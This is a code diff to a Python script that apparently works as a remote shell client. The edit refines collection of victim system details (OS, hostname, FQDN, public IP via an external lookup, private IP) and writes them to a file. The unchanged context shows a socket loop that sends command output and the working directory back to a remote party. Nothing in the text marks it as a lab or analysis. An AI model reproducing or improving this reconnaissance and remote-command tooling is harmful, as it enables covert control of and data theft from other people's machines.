@@ -1,3 +1,4 @@
+
 import socket
 import os
 import re
@@ -14,22 +15,27 @@ def info():
     ip_address = socket.gethostbyname(hostname)  # returns IPv4 address with respect to hostname
     os.system('ip addr > out.txt')
     f = open("out.txt", "r")
-    strings = re.findall(r'192.168.\d(1, 3).\d(1, 3)', f.read())
+    strings = re.findall(r'192.168.\d{1,3}.\d{1,3}', f.read())
     ip = get('https://api.ipify.org').text
 
     output1 = 'Operating System : '+str(system_data.system)
     # output1 = str(output)
     
-    output2 = 'Machine : '+ str(system_data.machine)
-    output3 = 'Processor : '+ str(system_data.processor)
-    output4 = 'Release : '+ str(system_data.release)
-    output5 = 'Version : '+ str(system_data.version)
-    output6 = 'Hostname : ' + str(hostname)
-    output7 = 'IP Address : ' + str(ip_address)
-    output8 = 'FQDN : ' + str(fqdn)
-    output9 = 'Public IP address : '+ str(ip)
-    output10 = 'Private IP Address : ' + str(strings[-2])
-    output = output1 +'/n'+ output2 +'/n'+ output3 +'/n'+ output4 +'/n'+ output5 +'/n'+ output6 +'/n'+ output7 +'/n'+ output8 +'/n'+ output9 +'/n'+ output10
+    with open("sample.txt","w") as f :
+        output = f'''
+Operating System : {str(system_data.system)}
+Machine : {str(system_data.machine)}
+Processor :  {str(system_data.processor)}
+Release : {str(system_data.release)}
+Version : {str(system_data.version)}
+Hostname : {str(hostname)}
+IP Address : {str(ip_address)}
+FQDN : {str(fqdn)}
+Public IP address : {str(ip)}
+Private IP Address : {str(strings[-2])}
+
+        '''
+        f.write(output)
     return output
 
 s = socket.socket()
@@ -62,5 +68,4 @@ while True:
         s.send(str.encode(output_str + currentWD))
 
         print(output_str)
-
         
